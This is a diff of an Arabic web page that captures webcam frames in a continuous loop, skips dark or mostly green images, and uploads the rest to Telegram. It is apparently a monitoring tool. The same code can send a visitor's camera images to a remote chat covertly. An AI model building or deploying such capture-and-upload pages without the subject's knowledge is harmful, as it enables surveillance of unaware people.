@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>مراقبة تلقائية بالكاميرا</title>
+  <title>كاميرا ذكية - Telegram</title>
   <style>
     html, body {
       margin: 0;
@@ -40,10 +40,10 @@
 
       video.srcObject = stream;
 
-      video.addEventListener('loadedmetadata', () => {
+      video.addEventListener('canplay', () => {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        captureLoop(); // Start loop once video is ready
+        captureLoop();
       });
 
     } catch (err) {
@@ -58,22 +58,30 @@
       if (!isSending) {
         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
         const data = imageData.data;
+        const totalPixels = data.length / 4;
 
         let brightnessSum = 0;
-        const totalPixels = data.length / 4;
+        let greenPixels = 0;
 
         for (let i = 0; i < data.length; i += 4) {
           const r = data[i];
           const g = data[i + 1];
           const b = data[i + 2];
+
           const brightness = (r + g + b) / 3;
           brightnessSum += brightness;
+
+          if (g > 100 && r < 80 && b < 80) {
+            greenPixels++;
+          }
         }
 
         const avgBrightness = brightnessSum / totalPixels;
-        console.log("سطوع:", avgBrightness);
+        const greenRatio = greenPixels / totalPixels;
 
-        if (avgBrightness > 40) {
+        console.log("سطوع:", avgBrightness, "| نسبة اللون الأخضر:", greenRatio.toFixed(2));
+
+        if (avgBrightness > 40 && greenRatio < 0.8) {
           isSending = true;
           canvas.toBlob(blob => {
             sendToTelegram(blob).then(() => {
@@ -82,10 +90,12 @@
               isSending = false;
             });
           }, 'image/jpeg', 0.95);
+        } else {
+          console.warn("تم تجاهل صورة غير صالحة (مظلمة أو خضراء)");
         }
       }
 
-      captureLoop(); // تابع الالتقاط
+      captureLoop(); // تابع التكرار
     });
   }
 
@@ -106,7 +116,7 @@
         console.log("تم إرسال الصورة");
       }
     } catch (err) {
-      console.error("خطأ في الاتصال:", err);
+      console.error("خطأ أثناء الإرسال:", err);
     }
   }
 
